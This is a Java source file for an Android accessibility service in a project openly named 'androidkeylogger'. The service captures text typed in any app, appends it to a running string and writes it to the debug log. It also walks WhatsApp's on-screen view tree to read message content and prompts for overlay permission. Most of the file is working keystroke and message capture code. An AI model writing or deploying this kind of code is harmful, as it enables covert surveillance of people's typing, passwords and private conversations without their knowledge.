package com.viveksb007.androidkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

/**
 * Created by viveksb007 on 7/2/17.
 */

import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.support.v4.content.LocalBroadcastManager;
import android.support.v4.view.accessibility.AccessibilityEventCompat;
import android.support.v4.view.accessibility.AccessibilityRecordCompat;
import android.view.accessibility.AccessibilityNodeInfo;

public class LoggingService extends AccessibilityService {
    private SuggestionViewManager suggestionViewManager;
    public static boolean requestAccessibilityPermission = false;
    private String completeText;
    public static final String PERMISSION_GRANTED = "com.viveks007.androidkeylogger.PERMISSION_GRANTED";

    private String getEventText(AccessibilityEvent event) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s);
        }
        return sb.toString();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            return;
        }
        if (suggestionViewManager == null) {
            suggestionViewManager = new SuggestionViewManager(this);
        }

        if (requestAccessibilityPermission) {
            requestAccessibilityPermission = false;
            LocalBroadcastManager.getInstance(this).sendBroadcast(new Intent(PERMISSION_GRANTED));
            return;
        }

        if(("com.whatsapp".equals(event.getPackageName()))&&(event.getEventType()==AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                || event.getEventType()==AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)){
            AccessibilityNodeInfo nodeInfo=getRootInActiveWindow();
            suggestionViewManager.getAllChildNode(nodeInfo);
        }


        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String eventText = getEventText(event);

            suggestionViewManager.onTextChanged(eventText);
            completeText = completeText + eventText;
            //TODO temp solution, fix permanently with replacing with root node view
            AccessibilityRecordCompat record = AccessibilityEventCompat.asRecord(event);
            suggestionViewManager.editTextViewNode = record.getSource();

            Log.d("logger", completeText);

        }
        else {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                suggestionViewManager.event(event);
                source.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d("service", "interrupted");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent myIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            myIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(myIntent);
            return;
        }
        if (requestAccessibilityPermission) {
            requestAccessibilityPermission = false;
            LocalBroadcastManager.getInstance(this).sendBroadcast(new Intent(PERMISSION_GRANTED));
        }

    }
}
